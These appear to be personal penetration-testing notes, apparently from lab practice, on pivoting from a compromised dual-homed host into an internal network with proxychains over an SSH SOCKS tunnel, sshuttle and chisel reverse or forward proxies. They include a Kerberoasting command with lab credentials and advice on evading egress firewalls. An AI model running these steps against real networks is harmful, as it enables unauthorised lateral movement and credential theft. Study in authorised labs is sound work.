- Imagine if we gain access to a **machine with 2 network interfaces**.
- These interfaces, share **a network which was not available to us** previously.
- We need to ==**access the other previously unaccessible network**==. 

![[Pasted image 20250401145157.png]]

# Machine Details
---
- **Access to the `box1` machine** is present with following interfaces:
- ==**.10.5 network is not accessible** :==

 	![[Pasted image 20250401145541.png]]

# Using proxychains
---
- `cat /etc/proxychains4.conf`
	- We need to **bind to `9050`** port:
	 ![[Pasted image 20250401145849.png]]
- `ssh -f -N -D 9050 -i id_rsa root@10.10.155.5`
	- `-f`: background ssh
	- `-N`: we don't want to execute remote commands, just for port forwarding
	- `-D`: port to bind
	- ![[Pasted image 20250401150121.png]]
- **Running commands through proxychains:**
---
   - `proxychains nmap -p 2049 10.10.10.255` (skip -p for top 1000 ports)
   - `proxychains nmap 10.10.10.255 -sT` (if prev doesn't work)
   - `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.255 -request`
   - `proxychains xfreerdp3 /v:[10.0.1.9](10.10.10.255)  /u:fcastle /p:myPassword01`
   - `proxychains firefox` => **==Firefox through proxychains => Accessing we services of other interface network==**


# Using sshuttle
---
- `sudo pip install sshuttle`
- `sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`
	- First address -> our accessible network address
	- Second address -> network to connect with on previous network
	- `ssh-cmd` -> command to run
- Now as long as this window is open, **==we can run commands directly==** like:
	- `nmap 10.10.10.255 -p88`
	- ![[Pasted image 20250401150901.png]]
- **Note: If we get error**
	**`Read from remote host 10.200.57.200: Connection reset by peer**
	**`client_loop: send disconnect: Broken pipe`**
	**`c : fatal: ssh connection to server (pid 22136) exited with returncode 255`**
	- This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to
	- ==Use the `-x` option to `exclude` compromised server ip:==
		- `sshuttle -r root@10.200.57.200 10.200.57.0/24 --ssh-cmd "ssh -i ./prod_root_id_rsa.pem" -x 10.200.57.200`
# Chisel
---
# Reverse SOCKS Proxy (Attacker -> Server, Victim -> Client)
---
- Client connects with server
- **Client makes decisions and initiates connection**
- ==Good for **evading egress firewalls** and when **victim can reach the attacker**.==
- On Attacker machine:
	- `chisel server --socks5 --reverse -p <port_number>`
- On Victim machine:
	- `./chisel client --fingerprint <fingerprint_from_server_node> <ip_address>:<server_port> R:socks`
 - Foxyproxy setup: (**1080 is default proxy port for reverse connections**)
	![[Pasted image 20250404121940.png]]
# Forward SOCKS Proxy (Victim -> Server, Attacker -> Client)
---
- Good when **==victim cannot reach attacker but attacker can==**.
- On Attacker machine:
	- `chisel client <compromised_ip>:<port_on_compromised_ip> <local_port_for_proxy>:sock`
- On Victim machine:
	- `chisel server -p <port_to_open> --socks5`
- Foxyproxy setup: ![[Pasted image 20250404165708.png]]

# Reverse Single Mode 
- On Attacker machine:
	- `chisel server --socks5 --reverse -p <port_number>`
- On Victim machine:
	- `./chisel client --fingerprint <fingerprint_from_server_node> <ip_address>:<server_port> R:<port_to_send_on_server>:<ip_to_connect_with>:<port_to_forward_on_secondary_victim_machine>`
		- `-R` : reverse
	- ==Now we can access  `localhost:<port_to_send_on_server>` which would be `secondary ip of victim`'s forwarded port==
- For browser interaction: **proxy by patterns**
- For commands use : **proxychains command**
